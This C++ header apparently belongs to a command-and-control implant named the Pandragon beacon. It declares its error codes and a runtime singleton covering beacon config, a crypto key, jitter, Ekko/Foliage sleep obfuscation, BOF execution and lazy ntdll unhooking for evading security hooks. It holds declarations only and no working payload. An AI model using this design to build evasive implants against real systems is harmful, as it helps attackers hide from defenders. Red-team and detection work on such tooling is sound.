#pragma once

#include <cstdint>
#include <atomic>
#include "resolver.h"
#include "config_parser.h"

extern functionTable* g_functionTable;

/* ============================================================================
 * Error Handling
 * ============================================================================ */

/**
 * @brief Unified error codes for Pandragon operations
 */
enum class BeaconError : int32_t {
    SUCCESS                 = 0,
    ALLOCATION_FAILED       = 1,
    DECRYPTION_FAILED       = 2,
    ENCRYPTION_FAILED       = 3,
    NETWORK_ERROR           = 4,
    INVALID_COMMAND         = 5,
    INVALID_PARAMETER       = 6,
    FILE_NOT_FOUND          = 7,
    FILE_READ_ERROR         = 8,
    FILE_WRITE_ERROR        = 9,
    TRANSFER_SLOT_EXHAUSTED = 10,
    TRANSFER_TIMEOUT        = 11,
    TRANSFER_INVALID_CHUNK  = 12,
    COFF_LOAD_FAILED        = 13,
    COFF_EXEC_FAILED        = 14,
    CONFIG_PARSE_FAILED     = 15,
    INIT_FAILED             = 16,
    NOT_INITIALIZED         = 17,
    BUFFER_TOO_SMALL        = 18,
    UNKNOWN_ERROR           = 19
};

/**
 * @brief Convert error code to string (for debugging)
 */
inline const char* BeaconErrorToString(BeaconError err) {
    switch (err) {
        case BeaconError::SUCCESS:                 return "SUCCESS";
        case BeaconError::ALLOCATION_FAILED:       return "ALLOCATION_FAILED";
        case BeaconError::DECRYPTION_FAILED:       return "DECRYPTION_FAILED";
        case BeaconError::ENCRYPTION_FAILED:       return "ENCRYPTION_FAILED";
        case BeaconError::NETWORK_ERROR:           return "NETWORK_ERROR";
        case BeaconError::INVALID_COMMAND:         return "INVALID_COMMAND";
        case BeaconError::INVALID_PARAMETER:       return "INVALID_PARAMETER";
        case BeaconError::FILE_NOT_FOUND:          return "FILE_NOT_FOUND";
        case BeaconError::FILE_READ_ERROR:         return "FILE_READ_ERROR";
        case BeaconError::FILE_WRITE_ERROR:        return "FILE_WRITE_ERROR";
        case BeaconError::TRANSFER_SLOT_EXHAUSTED: return "TRANSFER_SLOT_EXHAUSTED";
        case BeaconError::TRANSFER_TIMEOUT:        return "TRANSFER_TIMEOUT";
        case BeaconError::TRANSFER_INVALID_CHUNK:  return "TRANSFER_INVALID_CHUNK";
        case BeaconError::COFF_LOAD_FAILED:        return "COFF_LOAD_FAILED";
        case BeaconError::COFF_EXEC_FAILED:        return "COFF_EXEC_FAILED";
        case BeaconError::CONFIG_PARSE_FAILED:     return "CONFIG_PARSE_FAILED";
        case BeaconError::INIT_FAILED:             return "INIT_FAILED";
        case BeaconError::NOT_INITIALIZED:         return "NOT_INITIALIZED";
        case BeaconError::BUFFER_TOO_SMALL:        return "BUFFER_TOO_SMALL";
        default:                                   return "UNKNOWN_ERROR";
    }
}

/* ============================================================================
 * Sleep Obfuscation Methods
 * ============================================================================ */

enum class SleepObfMethod : uint8_t {
    NONE    = 0,
    EKKO    = 1,
    FOLIAGE = 2
};

/* ============================================================================
 * Forward Declarations
 * ============================================================================ */

class FileTransferManager;
class NetworkManager;
class CommandDispatcher;

/* ============================================================================
 * Pandragon Runtime - Central State Manager
 * ============================================================================ */

/**
 * @brief Central runtime state manager for the Pandragon beacon
 *
 * This class consolidates all global state into a single singleton:
 * - functionTable (API resolver)
 * - Beacon configuration
 * - File transfer state
 * - Network state
 * - Command dispatch
 * - Async BOF channel (for Sleep Mask Integration)
 *
 * Usage: PandragonRuntime::getInstance()
 */
class PandragonRuntime {
public:
    /** @brief Get the singleton instance */
    static PandragonRuntime& getInstance();

    /** @brief Initialize the runtime @param funcTable API function table @return BeaconError::SUCCESS on success */
    BeaconError initialize(functionTable* funcTable);

    // =========================================================================
    // Accessors
    // =========================================================================

    [[nodiscard]] functionTable* getfuncTable() const { return m_funcTable; }
    [[nodiscard]] BeaconConfig& getConfig() { return m_config; }
    [[nodiscard]] const BeaconConfig& getConfig() const { return m_config; }
    [[nodiscard]] const uint8_t* getBeaconId() const { return m_config.beacon_id; }
    [[nodiscard]] const uint8_t* getCryptoKey() const { return m_config.crypto_key; }

    // =========================================================================
    // Async BOF Channel (for Sleep Mask Integration)
    // =========================================================================

    [[nodiscard]] volatile struct bof_channel* getAsyncChannel() const { return m_asyncChannel; }
    void setAsyncChannel(volatile struct bof_channel* ch) { m_asyncChannel = ch; }

    // =========================================================================
    // Sleep State (for BOFs to check if beacon .text is encrypted)
    // =========================================================================

    enum class SleepState : uint8_t {
        AWAKE = 0,
        SLEEPING = 1      // Ekko/Foliage active — .text encrypted, don't call beacon functions
    };

    [[nodiscard]] SleepState getSleepState() const { return m_sleepState.load(std::memory_order_acquire); }
    void setSleepState(SleepState state) { m_sleepState.store(state, std::memory_order_release); }

    // =========================================================================
    // Sleep Configuration
    // =========================================================================

    [[nodiscard]] uint64_t getSleepDuration() const {
        return m_sleepDuration.load(std::memory_order_relaxed);
    }
    void setSleepDuration(uint64_t ms) {
        m_sleepDuration.store(ms, std::memory_order_relaxed);
    }

    [[nodiscard]] uint8_t getJitterPercent() const {
        return m_jitterPercent.load(std::memory_order_relaxed);
    }
    void setJitterPercent(uint8_t pct) {
        m_jitterPercent.store(pct, std::memory_order_relaxed);
    }

    // =========================================================================
    // Sleep Obfuscation
    // =========================================================================

    [[nodiscard]] SleepObfMethod getSleepObfMethod() const {
        return m_sleepObfMethod.load(std::memory_order_relaxed);
    }
    void setSleepObfMethod(SleepObfMethod method) {
        m_sleepObfMethod.store(method, std::memory_order_relaxed);
    }

    // =========================================================================
    // Kill Date
    // =========================================================================

    [[nodiscard]] uint32_t getKillDate() const { return m_killDate; }
    void setKillDate(uint32_t unix_timestamp) { m_killDate = unix_timestamp; }

    // =========================================================================
    // Manager Access
    // =========================================================================

    [[nodiscard]] FileTransferManager& getFileTransferManager() { return *m_fileTransferManager; }
    [[nodiscard]] NetworkManager& getNetworkManager() { return *m_networkManager; }
    [[nodiscard]] CommandDispatcher& getCommandDispatcher() { return *m_commandDispatcher; }

    // =========================================================================
    // Initialization State
    // =========================================================================

    [[nodiscard]] bool isInitialized() const {
        return m_initialized.load(std::memory_order_acquire);
    }

    /**
     * @brief Shut down the runtime: destroy managers and release resources.
     */
    void shutdown();

    // =========================================================================
    // Lazy Unhook
    // =========================================================================

    [[nodiscard]] bool isUnhooked() const { return m_ntdllUnhooked.load(std::memory_order_acquire); }
    [[nodiscard]] void* getPhantomNtdll() const { return m_phantomNtdllBase.load(std::memory_order_acquire); }

    /**
     * @brief Transparent lazy unhook: called before BOF execution.
     *        If not already unhooked and lazy_unhook is enabled, calls UnhookNtdll().
     * @return true if ntdll is clean (was already or just unhooked), false on failure
     */
    bool ensureUnhooked();

private:
    // Singleton construction
    PandragonRuntime();

    // Non-copyable, non-movable
    PandragonRuntime(const PandragonRuntime&)            = delete;
    PandragonRuntime& operator=(const PandragonRuntime&) = delete;
    PandragonRuntime(PandragonRuntime&&)                 = delete;
    PandragonRuntime& operator=(PandragonRuntime&&)      = delete;

    // State
    functionTable*                m_funcTable;
    BeaconConfig                    m_config;
    std::atomic<uint64_t>           m_sleepDuration;
    std::atomic<uint8_t>            m_jitterPercent;
    std::atomic<SleepObfMethod>     m_sleepObfMethod;
    std::atomic<bool>               m_initialized;
    uint32_t                        m_killDate;

    // Managers (dynamically allocated to avoid static init order issues)
    FileTransferManager*            m_fileTransferManager;
    NetworkManager*                 m_networkManager;
    CommandDispatcher*              m_commandDispatcher;

    // Async BOF Channel (for Sleep Mask Integration)
    volatile struct bof_channel*    m_asyncChannel;

    // Sleep State (for BOFs to check if beacon .text is encrypted)
    std::atomic<SleepState>         m_sleepState;

    // Lazy unhook state
    std::atomic<void*>              m_phantomNtdllBase;
    std::atomic<bool>               m_ntdllUnhooked;
};

/* ============================================================================
 * Runtime Helpers
 * ============================================================================ */

/**
 * @brief Apply jitter to sleep duration using RDTSC
 */
uint32_t ApplySleepJitter(uint32_t sleep_ms, uint8_t jitter_pct);

/**
 * @brief Execute sleep with optional obfuscation
 */
void ExecuteSleep(functionTable* funcTable, uint32_t sleep_ms, uint8_t jitter_pct);
